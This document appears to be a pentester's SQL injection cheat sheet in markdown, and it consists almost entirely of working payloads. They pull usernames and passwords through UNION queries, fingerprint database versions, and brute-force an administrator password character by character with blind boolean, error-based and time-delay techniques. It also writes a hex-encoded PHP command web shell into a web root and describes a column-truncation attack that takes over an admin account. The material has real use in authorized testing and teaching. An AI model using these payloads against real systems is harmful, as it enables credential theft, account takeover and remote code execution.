---
title: SQL Injection Cheat Sheet
desc: Cheat Sheet for SQL injection.
tags: [Database, SQLi, Web]
alts: [Sqlmap]
website: https://portswigger.net/web-security/sql-injection/cheat-sheet
render_with_liquid: false
---

*URL encode as neeeded.  

*Last char is `--` or `#`.

<br />

## Examples

```html
' OR 1=1--
' OR 1=1#
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
' UNION SELECT username,password FROM users--
' UNION SELECT username || '~' || password FROM users--
' UNION SELECT NULL,username || '~' || password FROM users--
' UNION SELECT username,password FROM users WHERE username='admin' AND password='password1'--
' UNION SELECT username,password FROM users WHERE username='admin' OR password='password1'--
' UNION SELECT username,password FROM users WHERE username='admin' AND password LIKE 'pas%'--
<!-- BINARY: sensive to upper_case and lower_case -->
' UNION SELECT username,password FROM users WHERE username='admin' AND BINARY password='PassWord'--

<!-- MySQL, Microsoft  -->
' UNION SELECT @@version--
' UNION SELECT @@version#
' UNION SELECT NULL,@@version--
' UNION SELECT NULL,@@version#
<!-- Oracle -->
' UNION SELECT 'a' FROM dual--
' UNION SELECT 'a','b' FROM dual--
' UNION SELECT * FROM v$version--
' UNION SELECT BANNER,NULL FROM v$version--
<!-- PostgreSQL -->
' UNION SELECT version()--

<!-- Get table name -->
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT table_name,NULL FROM all_tables--
<!-- Get column name -->
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='users_abcdef'--
<!-- Get values in column -->
' UNION SELECT username_ghijkl,password_mnopqr FROM users_abcdef--
```

<br />

## Blind SQL

```html
<!-- HTTP response -->
' AND '1'='1
' AND '1'='2
' AND (SELECT 'a' FROM users LIMIT 1)='a
<!-- Check if username 'administrator' exists in 'users' -->
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
<!-- If so, determine the password length -->
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
...
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=8)='a
<!-- Brute force password char by char ($a$ is the target of brute force) -->
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='$a$
' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='$a$
...
' AND (SELECT SUBSTRING(password,8,1) FROM users WHERE username='administrator')='$a$

<!-- HTTP response condition error -->
'
''
'||(SELECT '')||'
'||(SELECT '' FROM dual)||'
'||(SELECT '' FROM fake_table)||'
'||(SELECT '' FROM users WHERE ROWNUM = 1||'
'|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
'|| (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
<!-- Check if username 'administrator' exists in 'users' -->
'|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
<!-- If so, determine the password length -->
''||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
''||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
...
''||(SELECT CASE WHEN LENGTH(password)=8 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
<!-- Brute force password char by char ($a$ is the target of brute force) -->
'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
...
'||(SELECT CASE WHEN SUBSTR(password,8,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

<!-- Time delay -->
' AND sleep(5)--
'||pg_sleep(10)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
'; SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
<!-- Check if username 'administrator' exists in 'users' -->
'; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
<!-- If so, determine the password length -->
'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>2) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
...
'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)=8) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
<!-- Brute force password char by char ($a$ is the target of brute force) -->
'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,2,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
...
'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,8,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

<br />

## Write Files

- Write new php file. '0x3C3F...' is hex ( <?php system($_GET["cmd"]) ?> in here )
- Access to http://10.0.0.1/shell.php?cmd=whoami

```html
' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED by 0x3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E--
' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED by 0x3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E#
```

<br />

## Truncation Attack

```sh
# If the table shema is like the following...
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);


# -------------------------------------------------------

# POST request
POST /create-user HTTP/1.1
...

# Create another new "admin" with more than 64 characters. Btw, "+" means the spaces.
username=admin+++++++++++++++++++++++++++++++++++++++++++++++++++++++++random&password=password
# ---------------------------------------------------------

# Then, login with your new admin credential.
username=admin&password=password

# Or fetch the admin's information.
SELECT * FROM users WHERE username='admin';
# Return the values are the real admin's information.
username = admin
password = <REAL_ADMIN_PASSWORD>
```